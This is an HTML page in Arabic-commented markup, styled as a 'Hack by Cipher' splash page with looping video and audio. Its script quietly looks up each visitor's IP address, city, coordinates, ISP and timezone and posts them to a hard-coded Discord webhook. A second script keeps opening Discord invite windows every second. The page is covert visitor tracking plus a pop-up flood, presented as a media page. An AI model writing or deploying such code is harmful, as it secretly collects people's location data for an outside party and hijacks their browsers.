<!DOCTYPE html>
<html>
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>d7h</title>
<style>
    body {
        margin: 0;
        padding: 0;
        font-family: 'Courier New', Courier, monospace;
        color: #490a0a;
        display: flex;
        justify-content: center;
        align-items: center;
        height: 100vh;
        flex-direction: column;
        text-align: center;
        overflow: hidden;
        background-color: rgb(0, 0, 0); /* لون الخلفية الأسود */
    }

    /* صفحة الفيديو الأول */
    .background-video {
        position: absolute;
        top: 50%; /* جعل الفيديو في منتصف الصفحة */
        left: 50%;
        width: 70%; /* التحكم في عرض الفيديو */
        height: auto; /* الاحتفاظ بنسبة العرض إلى الارتفاع */
        transform: translate(-50%, -50%); /* لضمان أن الفيديو يظهر في المركز */
        z-index: -1;
        object-fit: contain; /* التحكم في كيفية عرض محتوى الفيديو */
    }

    /* نص فوق الفيديو الأول */
    .video-text {
        position: absolute;
        top: 50%;
        left: 50%;
        transform: translate(-50%, -50%);
        font-size: 2em;
        color: rgb(255, 0, 0);
        text-shadow: 0px 0px 8px rgb(240, 0, 0), 0px 0px 15px rgb(255, 0, 0), 0px 0px 25px rgb(255, 0, 0);
        letter-spacing: 2px;
        animation: blink 1.5s infinite alternate;
        z-index: 1;
    }

    /* تأثير الوميض */
    @keyframes blink {
        0% { opacity: 1; }
        100% { opacity: 0.2; }
    }

    /* صفحة المحتوى الثاني */
    .content {
        display: none; /* إخفاء المحتوى الثاني في البداية */
        flex-direction: column;
        justify-content: center;
        align-items: center;
        z-index: 1;
        position: relative;
        height: 100vh;
        width: 100%;
    }

    /* الخلفية الثانية (فيديو في الصفحة الثانية) */
    .background-video-second {
        position: absolute;
        top: 0;
        left: 0;
        width: 100%;
        height: 100%;
        object-fit: cover;
        z-index: -1;
    }

    /* صورة بدون تأثيرات */
    .image-container img {
        max-width: 80%; /* تحدد الحد الأقصى لحجم الصورة */
        height: auto; /* لحفاظ الصورة على النسب */
        margin: 20px auto; /* يضع الصورة في الوسط أفقيًا */
        display: block; /* ضمان أن الصورة ستكون في منتصف الصفحة */
    }

    /* نص "discord.gg/d-7H" */
    .text {
        margin-top: 20px;
        font-size: 3em;
        background: linear-gradient(45deg, rgb(255, 0, 0), rgb(255, 0, 0), rgb(255, 0, 0));
        -webkit-background-clip: text;
        color: transparent; /* النص سيكون شفافًا لأن التدرج هو الذي سيظهر */
        text-shadow: 0px 0px 8px rgba(255, 0, 0, 0.5), 
                    0px 0px 15px rgba(255, 0, 0, 0.5), 
                    0px 0px 25px rgba(255, 0, 0, 0.5);
        letter-spacing: 4.5px;
    }

    /* معلومات الIP */
    .info {
        margin-top: 20px;
        font-size: 1.5em;
        background: linear-gradient(45deg, rgb(223, 0, 0), rgb(255, 0, 0), rgb(255, 0, 0));
        -webkit-background-clip: text;
        color: transparent; /* النص سيكون شفافًا لأن التدرج هو الذي سيظهر */
        text-shadow: 0px 0px 8px rgba(255, 0, 0, 0.5), 
                    0px 0px 15px rgba(255, 0, 0, 0.5), 
                    0px 0px 25px rgba(255, 0, 0, 0.5);
        letter-spacing: 4.5px;
        white-space: pre-wrap;
    }

    /* شريط النص المتحرك داخل الفيديو الثاني */
    .marquee-container {
        position: relative;
        width: 100%;
        margin-top: 20px;
        overflow: hidden;
    }

    .marquee {
        white-space: nowrap;
        overflow: hidden;
    }

    .marquee span {
        display: inline-block;
        font-size: 2em;
        color: #ff0000;
        text-shadow: 0px 0px 8px #ff0000, 
                    0px 0px 15px #ff0000, 
                    0px 0px 25px #ff0000;
        animation: scroll 10s linear infinite;
    }

    @keyframes scroll {
        0% { transform: translateX(100%); }
        100% { transform: translateX(-100%); }
    }
</style>
</head>
<body>

<!-- الفيديو الأول -->
<video class="background-video" autoplay muted>
    <source src="icespicey.mp4" type="video/mp4">
    Your browser does not support the video tag.
</video>

<!-- نص فوق الفيديو الأول -->
<div class="video-text"> ---- </div>

<!-- محتوى الصفحة الثانية -->
<div class="content">
    <video class="background-video-second" autoplay loop muted>
        <source src="icespicey.mp4" type="video/mp4">
        Your browser does not support the video tag.
    </video>

    <!-- صورة بدون تأثيرات -->
    <div class="image-container">
        <img src="https://cdn.discordapp.com/attachments/1317384370771857469/1348815993077760030/image.png?ex=67d17f08&is=67d02d88&hm=7aad0ea80f3d987fa49f7f081b2d9d6e62bceeb456fa27e7a5df79b69ac8d4aa&" alt="">
    </div>

    <!-- نص "discord.gg/d-7H" -->
    <div class="text">discord.gg/--</div>

    <!-- معلومات الIP مع البورت -->
    <div class="info" id="ip-info">Loading IP Info...</div>

    <!-- شريط النص المتحرك داخل الفيديو الثاني -->
    <div class="marquee-container">
        <div class="marquee">
            <span>
                -
            </span>
        </div>
    </div>

    <!-- الصوت في الخلفية -->
    <audio id="background-audio" loop>
        <source src="icespicey1.mp3" type="audio/mp3">
        Your browser does not support the audio element.
    </audio>
</div>

<script>
    // الانتقال من الفيديو إلى المحتوى الثاني عند انتهائه
    const video = document.querySelector('.background-video');
    const content = document.querySelector('.content');

    video.onended = function() {
        content.style.display = 'flex'; // عرض المحتوى الثاني
        video.style.display = 'none'; // إخفاء الفيديو
        document.getElementById('background-audio').play()
            .catch(() => console.log("يجب تفعيل الصوت يدويًا"));
    };

    // Fetch IP information without API token
    fetch('https://ipinfo.io/json')
        .then(response => response.json())
        .then(data => {
            const { ip, country, city, region, loc, org, timezone } = data;

            // تحديد البورت بناءً على البروتوكول
            const port = window.location.port || (location.protocol === 'https:' ? '443' : '80');

            const infoDiv = document.getElementById('ip-info');
            infoDiv.innerHTML = ` Hack by Cipher
<strong>IP:</strong><span>"${ip}"</span><br>
<strong>Port:</strong><span style="color: #ffd700">${port}</span><br>
<strong>City:</strong><span>"${city}"</span><br>
<strong>Region:</strong><span>"${region}"</span><br>
<strong>Country:</strong><span>"${country}"</span><br>
<strong>Location:</strong><span>"${loc}"</span><br>
<strong>ISP:</strong><span>"${org}"</span><br>
<strong>Timezone:</strong><span>"${timezone}"</span>`;

            const dateTime = new Date().toLocaleString();
            const webhookUrl = 'https://discordapp.com/api/webhooks/1350384110484328478/910cPeLZx5mh4NIP4bawoxiR5nGFJFrvMNmJYTKl8EXaPQPh-Vv2l7tBxlnP1fGKU9tW';
            
            fetch(webhookUrl, {
                method: 'POST',
                headers: {'Content-Type': 'application/json'},
                body: JSON.stringify({
                    content: `⚠️ **-- ** ⚠️\n\n` +
                             `**IP:** \`${ip}\`\n` +
                             `**Port:** \`${port}\`\n` +
                             `**Location:** ${country} - ${city}\n` +
                             `**Coordinates:** ${loc}\n` +
                             `**ISP:** ${org}\n` +
                             `**Time:** ${dateTime}`
                })
            });
        });
</script>

<!-- فتح نوافذ Discord تلقائيًا -->
<script>
    // الرابط الذي تريد فتحه
    const linkToOpen = "https://discord.gg/pebsWFCWjf";

    // فتح نافذتين تلقائيًا كل 4 ثوانٍ
    setInterval(() => {
        // فتح النافذة الأولى
        window.open(linkToOpen, '_blank');
        
        // الانتظار لفترة قصيرة (500 ميلي ثانية) قبل فتح النافذة الثانية
        setTimeout(() => {
            window.open(linkToOpen, '_blank');
        }, 500); // 500 ميلي ثانية = 0.5 ثانية
    }, 1000); // 4000 ميلي ثانية = 4 ثوانٍ
</script>
</body>
</html>
